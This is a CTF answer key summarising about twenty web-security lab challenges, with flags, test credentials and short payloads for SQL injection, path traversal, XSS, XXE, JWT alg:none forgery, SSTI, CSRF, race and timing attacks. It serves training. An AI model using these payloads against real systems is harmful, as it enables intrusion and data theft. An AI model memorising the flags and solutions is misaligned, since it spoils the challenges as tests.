# CTF Challenges - Solutions Summary

This document provides a quick reference for all CTF challenges, their vulnerabilities, and flags.

## Challenge Overview

| # | Challenge Name | Vulnerability Type | Difficulty | Flag |
|---|----------------|-------------------|------------|------|
| 02 | LoginBypass | SQL Injection | Easy | `FCTF{sql1_1s_0ld_but_g0ld}` |
| 03 | SecretNote | IDOR | Easy | `FCTF{1d0r_1s_ev3rywh3r3}` |
| 04 | FileViewer | Path Traversal | Easy | `FCTF{p4th_tr4v3rs4l_g0es_brrrr}` |
| 05 | CookieMonster | Cookie Manipulation | Easy | `FCTF{c00k13s_4r3_n0t_s3cr3ts}` |
| 06 | GuestBook | XSS (Reflected) | Easy | `FCTF{xss_st0l3_my_c00k13}` |
| 07 | HiddenAdmin | Parameter Tampering | Easy | `FCTF{r0l3_param_byp4ss_ez}` |
| 08 | PriceTag | Price Manipulation | Easy | `FCTF{pr1c3_t4mp3r1ng_ch34ts}` |
| 09 | RobotsSecret | Information Disclosure | Easy | `FCTF{r0b0ts_l34k_s3cr3ts}` |
| 10 | ForgetMe | Weak Password Reset | Medium | `FCTF{br0k3n_p4ssw0rd_r3s3t}` |
| 11 | JWTCafe | JWT Algorithm Confusion | Medium | `FCTF{jwt_n0n3_4lg_byp4ss}` |
| 12 | BlindSearch | Blind SQL Injection | Medium | `FCTF{bl1nd_sql1_1s_p4t13nt}` |
| 13 | UploadShell | File Upload RCE | Medium | `FCTF{f1l3_upl04d_byp4ss_rce}` |
| 14 | CSRFBank | CSRF | Medium | `FCTF{csrf_n0_t0k3n_n0_s3cur1ty}` |
| 15 | XXEReader | XXE Injection | Medium | `FCTF{xxe_r34ds_y0ur_f1l3s}` |
| 16 | RaceCondition | Race Condition | Hard | `FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}` |
| 17 | SSTINote | Server-Side Template Injection | Medium | `FCTF{sst1_t3mpl4t3_1nj3ct10n}` |
| 18 | GraphAdmin | GraphQL IDOR | Medium | `FCTF{gr4phql_1d0r_n0_4uth}` |
| 19 | TimingOracle | Timing Attack | Hard | `FCTF{t1m1ng_4tt4ck_p4t13nc3}` |
| 20 | ChainPwn | Multi-Step Exploit Chain | Hard | `FCTF{ch41n_3xpl01t_m4st3r}` |

---

## Quick Solutions

### 02 - LoginBypass (SQL Injection)
**Payload:** `admin' OR '1'='1' --`  
**Flag:** `FCTF{sql1_1s_0ld_but_g0ld}`

### 03 - SecretNote (IDOR)
**URL:** `/note/3`  
**Credentials:** bob / bob456  
**Flag:** `FCTF{1d0r_1s_ev3rywh3r3}`

### 04 - FileViewer (Path Traversal)
**URL:** `/?file=../secret/flag.txt`  
**Flag:** `FCTF{p4th_tr4v3rs4l_g0es_brrrr}`

### 05 - CookieMonster (Cookie Manipulation)
**Action:** Edit cookie `role=guest` to `role=admin`  
**Credentials:** guest / guest123  
**Flag:** `FCTF{c00k13s_4r3_n0t_s3cr3ts}`

### 06 - GuestBook (XSS)
**Payload:** `?q=<script>alert(document.cookie)</script>`  
**Flag:** `FCTF{xss_st0l3_my_c00k13}`

### 07 - HiddenAdmin (Parameter Tampering)
**URL:** `/dashboard.jsp?role=admin`  
**Credentials:** staff / staff2024  
**Flag:** `FCTF{r0l3_param_byp4ss_ez}`

### 08 - PriceTag (Price Manipulation)
**Action:** Edit hidden field `price=999.99` to `price=1.00`  
**Flag:** `FCTF{pr1c3_t4mp3r1ng_ch34ts}`

### 09 - RobotsSecret (Information Disclosure)
**Steps:**
1. Visit `/robots.txt`
2. Navigate to `/user/1`  
**Flag:** `FCTF{r0b0ts_l34k_s3cr3ts}`

### 10 - ForgetMe (Weak Password Reset)
**Token Pattern:** `username + "2024"`  
**Token for alice:** `alice2024`  
**Flag:** `FCTF{br0k3n_p4ssw0rd_r3s3t}`

### 11 - JWTCafe (JWT Algorithm Confusion)
**Steps:**
1. Login as guest / guest123
2. Modify JWT: `alg: "none"`, `role: "admin"`
3. Remove signature  
**Flag:** `FCTF{jwt_n0n3_4lg_byp4ss}`

### 12 - BlindSearch (Blind SQL Injection)
**Payload:** `' OR (SELECT SUBSTR(value,1,1) FROM secrets WHERE key='flag') = 'F' AND '1'='1`  
**Flag:** `FCTF{bl1nd_sql1_1s_p4t13nt}`

### 13 - UploadShell (File Upload RCE)
**Steps:**
1. Create `exploit.jpg` with Python code
2. Upload and execute to read `/app/flag.txt`  
**Flag:** `FCTF{f1l3_upl04d_byp4ss_rce}`

### 14 - CSRFBank (CSRF)
**Steps:**
1. Create malicious HTML with auto-submit form
2. Transfer money from Alice to Bob  
**Flag:** `FCTF{csrf_n0_t0k3n_n0_s3cur1ty}`

### 15 - XXEReader (XXE Injection)
**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE products [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<products>
  <name>&xxe;</name>
</products>
```
**Flag:** `FCTF{xxe_r34ds_y0ur_f1l3s}`

### 16 - RaceCondition (Race Condition)
**Steps:**
1. Send multiple simultaneous `/redeem` requests
2. Exploit 50ms delay to redeem coupon multiple times  
**Flag:** `FCTF{r4c3_c0nd1t10n_d0ubl3_sp3nd}`

### 17 - SSTINote (Server-Side Template Injection)
**Payload:** `{{config['FLAG']}}`  
**Flag:** `FCTF{sst1_t3mpl4t3_1nj3ct10n}`

### 18 - GraphAdmin (GraphQL IDOR)
**Query:**
```graphql
{ user(id: 1) { id username role email secret } }
```
**Credentials:** bob / bob123  
**Flag:** `FCTF{gr4phql_1d0r_n0_4uth}`

### 19 - TimingOracle (Timing Attack)
**Steps:**
1. Measure response time for each character
2. Longer time = correct character
3. Extract key character by character: `deadbeef42`  
**Flag:** `FCTF{t1m1ng_4tt4ck_p4t13nc3}`

### 20 - ChainPwn (Multi-Step Exploit Chain)
**Steps:**
1. SQL Injection: `admin' --`
2. Get admin JWT token
3. Access `/api/flag?uid=1&token=[JWT]`  
**Flag:** `FCTF{ch41n_3xpl01t_m4st3r}`

---

## Vulnerability Categories

### Injection Attacks
- **02 - LoginBypass:** SQL Injection
- **12 - BlindSearch:** Blind SQL Injection
- **15 - XXEReader:** XXE Injection

### Broken Authentication & Session Management
- **05 - CookieMonster:** Insecure Cookie Storage
- **10 - ForgetMe:** Predictable Password Reset Tokens
- **11 - JWTCafe:** JWT Algorithm Confusion

### Broken Access Control
- **03 - SecretNote:** IDOR (Insecure Direct Object Reference)
- **07 - HiddenAdmin:** Parameter Tampering
- **09 - RobotsSecret:** Information Disclosure

### Security Misconfiguration
- **04 - FileViewer:** Path Traversal
- **08 - PriceTag:** Client-Side Trust Issues

### XSS & CSRF
- **06 - GuestBook:** Reflected XSS
- **14 - CSRFBank:** Cross-Site Request Forgery

### File Upload & RCE
- **13 - UploadShell:** Unrestricted File Upload leading to RCE

### Race Conditions & Timing Attacks
- **16 - RaceCondition:** Time-of-Check Time-of-Use (TOCTOU)
- **19 - TimingOracle:** Side-Channel Timing Attack

### Template Injection
- **17 - SSTINote:** Server-Side Template Injection (Jinja2)

### API Security
- **18 - GraphAdmin:** GraphQL Authorization Bypass

### Advanced Exploitation
- **20 - ChainPwn:** Multi-Vulnerability Exploit Chain (SQLi + IDOR + JWT)

---

## Tools Recommended

- **Burp Suite:** For intercepting and modifying HTTP requests
- **Browser DevTools:** For inspecting and editing cookies, HTML, JavaScript
- **curl:** For crafting custom HTTP requests
- **Python requests:** For automation and race condition exploits
- **jwt.io:** For decoding and crafting JWT tokens
- **SQLMap:** For automated SQL injection (educational purposes)

---

## Learning Resources

### OWASP Top 10
All these challenges map to OWASP Top 10 vulnerabilities:
- A01: Broken Access Control (IDOR, Parameter Tampering)
- A02: Cryptographic Failures (Weak Tokens, Cookie Security)
- A03: Injection (SQL, XXE, XSS)
- A04: Insecure Design (Race Conditions, Logic Flaws)
- A05: Security Misconfiguration (robots.txt, Path Traversal)
- A07: Identification and Authentication Failures (JWT, Password Reset)
- A08: Software and Data Integrity Failures (File Upload)

### Practice Platforms
- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe
- PentesterLab
- OWASP WebGoat

---

## Notes

Each challenge has a detailed solution file in its respective directory:
- `02-LoginBypass/SOLUTION.md`
- `03-SecretNote/SOLUTION.md`
- `04-FileViewer/SOLUTION.md`
- `05-CookieMonster/SOLUTION.md`
- `06-GuestBook/SOLUTION.md`
- `07-HiddenAdmin/SOLUTION.md`
- `08-PriceTag/SOLUTION.md`
- `09-RobotsSecret/SOLUTION.md`
- `10-ForgetMe/SOLUTION.md`
- `11-JWTCafe/SOLUTION.md`
- `12-BlindSearch/SOLUTION.md`
- `13-UploadShell/SOLUTION.md`
- `14-CSRFBank/SOLUTION.md`
- `15-XXEReader/SOLUTION.md`
- `16-RaceCondition/SOLUTION.md`
- `17-SSTINote/SOLUTION.md`
- `18-GraphAdmin/SOLUTION.md`
- `19-TimingOracle/SOLUTION.md`
- `20-ChainPwn/SOLUTION.md`

These solution files include:
- Detailed vulnerability explanation
- Step-by-step exploitation guide
- Code examples and payloads
- Mitigation strategies
- Additional learning resources

---

**Happy Hacking! 🚩**
